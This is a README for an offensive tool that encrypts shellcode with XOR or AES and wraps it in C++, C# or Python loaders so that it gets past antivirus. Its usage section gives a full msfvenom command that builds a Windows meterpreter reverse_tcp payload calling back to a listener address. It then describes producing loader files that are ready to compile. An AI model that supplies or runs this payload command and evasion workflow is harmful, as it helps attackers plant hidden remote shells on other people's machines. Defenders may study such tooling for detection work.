Shellcode wrapper written in Python and C++ to bypass antivirus
============

The technique uses two kind of code file:

1. The shellcode encoder/encrypter: `shellcode_encoder.py`
2. Various shellcode wrapper, in C++, C# and Python:
	- `encryptedShellcodeWrapper.cpp` - for now supports **only** XOR encryption
	- `encryptedShellcodeWrapper.cs` - supports both XOR and AES encryption
	- `encryptedShellcodeWrapper.py` - supports both XOR and AES encryption

Installation
----------------------
Installation is straight forward:
* Git clone this repository: 
* cd into the folder
* Install requirements using `pip install -r requirements.txt`
* Give the execution rights to the main script: `chmod +x shellcode_encoder.py`

Usage
----------------------
First, you need to obtain a usable shellcode from metasploit (*run it from a Kali distribution*), so something like:
```
root@kali:~# msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.52.130 LPORT=4444 -f raw > shellcode.raw
```

Second, run the `shellcode_encoder.py` script along with the desired arguments:
  - raw shellcode filename
  - encryption key
  - encryption type: `xor` or `aes`
  - desired output: `base64`, `cpp`, `csharp`, `python`

This will generate C#, C++ and Python code file in the `result` folder. Those files are ready to use/compile.
